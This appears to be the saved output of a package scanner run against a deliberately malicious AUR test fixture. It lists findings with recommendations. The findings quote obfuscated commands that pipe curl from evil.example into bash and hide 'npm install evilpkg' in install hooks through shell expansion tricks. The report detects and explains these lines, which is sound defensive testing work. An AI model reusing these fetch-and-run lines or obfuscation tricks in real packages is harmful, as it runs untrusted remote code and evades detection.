@@ -1,0 +1,120 @@
+
+Scan Results: resolver-operators
+============================================================
+
+[CRITICAL] DLE-001 Curl pipe to shell
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:13
+    Code:     ${c:1:4} -fsSL https://evil.example/stage1 | bash    [resolved →     curl -fsSL https://evil.example/stage1 | bash]
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] DLE-001 Curl pipe to shell
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:17
+    Code:     f() { "$1" -fsSL https://evil.example/stage2 | bash; }; f curl    [resolved →     f() { curl -fsSL https://evil.example/stage2 | bash; }; f curl]
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] DLE-001 Curl pipe to shell
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:23
+    Code:     $_f -fsSL https://evil.example/stage3 | $_s    [resolved →     curl -fsSL https://evil.example/stage3 | bash]
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook (install script)
+    Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.
+    Location: tests/fixtures/malicious/resolver-operators/resolver-operators.install:2
+    Code:     v=nZpZm; ${v//Z/} install evilpkg    [resolved →     v=nZpZm; npm install evilpkg]
+    Recommendation: Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.
+    Reference: CWE-494
+
+[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook (install script)
+    Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.
+    Location: tests/fixtures/malicious/resolver-operators/resolver-operators.install:4
+    Code:     zz install evilpkg    [resolved →     npm install evilpkg]
+    Recommendation: Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.
+    Reference: CWE-494
+
+[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook (install script)
+    Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.
+    Location: tests/fixtures/malicious/resolver-operators/resolver-operators.install:5
+    Code:     n$()pm install evilpkg    [de-obfuscated →     npm install evilpkg]
+    Recommendation: Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.
+    Reference: CWE-494
+
+[CRITICAL] ATOMIC-002 Node/Bun package manager in install hook (install script)
+    Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.
+    Location: tests/fixtures/malicious/resolver-operators/resolver-operators.install:6
+    Code:     $"n"$"pm" install evilpkg    [de-obfuscated →     npm install evilpkg]
+    Recommendation: Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/stage1
+    This package downloads and executes code from https://evil.example/stage1 at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:13
+    Code: curl -fsSL https://evil.example/stage1 | bash
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/stage2
+    This package downloads and executes code from https://evil.example/stage2 at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:17
+    Code: f() { curl -fsSL https://evil.example/stage2 | bash; }; f curl
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/stage3
+    This package downloads and executes code from https://evil.example/stage3 at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:23
+    Code: curl -fsSL https://evil.example/stage3 | bash
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[HIGH] OBF-020 Dynamic command name
+    The command word is an expansion the scanner cannot resolve (${x:1:3}, ${x//a/b}, ${x#p}, ${a[1]}, $(echo ... | tr ...), "$1") on a line that fetches a URL into a shell, or in front of a package-manager verb (install, add, i). Hiding the command name this way is how a payload dodges name-based rules; ordinary build lines such as ${CC:-gcc} or "${CMAKE[@]}" are not matched.
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:13
+    Code:     ${c:1:4} -fsSL https://evil.example/stage1 | bash
+    Recommendation: Review the line; the command being run is assembled at run time to avoid matching.
+    Reference: CWE-94
+
+[HIGH] OBF-020 Dynamic command name
+    The command word is an expansion the scanner cannot resolve (${x:1:3}, ${x//a/b}, ${x#p}, ${a[1]}, $(echo ... | tr ...), "$1") on a line that fetches a URL into a shell, or in front of a package-manager verb (install, add, i). Hiding the command name this way is how a payload dodges name-based rules; ordinary build lines such as ${CC:-gcc} or "${CMAKE[@]}" are not matched.
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:17
+    Code:     f() { "$1" -fsSL https://evil.example/stage2 | bash; }; f curl
+    Recommendation: Review the line; the command being run is assembled at run time to avoid matching.
+    Reference: CWE-94
+
+[HIGH] OBF-020 Dynamic command name (install script)
+    The command word is an expansion the scanner cannot resolve (${x:1:3}, ${x//a/b}, ${x#p}, ${a[1]}, $(echo ... | tr ...), "$1") on a line that fetches a URL into a shell, or in front of a package-manager verb (install, add, i). Hiding the command name this way is how a payload dodges name-based rules; ordinary build lines such as ${CC:-gcc} or "${CMAKE[@]}" are not matched.
+    Location: tests/fixtures/malicious/resolver-operators/resolver-operators.install:2
+    Code:     v=nZpZm; ${v//Z/} install evilpkg
+    Recommendation: Review the line; the command being run is assembled at run time to avoid matching.
+    Reference: CWE-94
+
+[HIGH] FUNC-001 Network access in build function
+    Function 'build' contains network access command 'curl'
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:16
+    Recommendation: Network access should happen in source= array, not build functions
+
+[HIGH] FUNC-001 Network access in build function
+    Function 'package' contains network access command 'curl'
+    Location: tests/fixtures/malicious/resolver-operators/PKGBUILD:20
+    Recommendation: Network access should happen in source= array, not build functions
+
+[MEDIUM] SRC-005 No sources with build function
+    Package has build() function but no source array
+    Recommendation: Verify this is intentional; build() usually needs sources
+
+
+
+============================================================
+Package: resolver-operators v1.0-1
+Scan duration: 24ms
+
+Found 16 issue(s):
+  10 CRITICAL
+  5 HIGH
+  1 MEDIUM
+============================================================
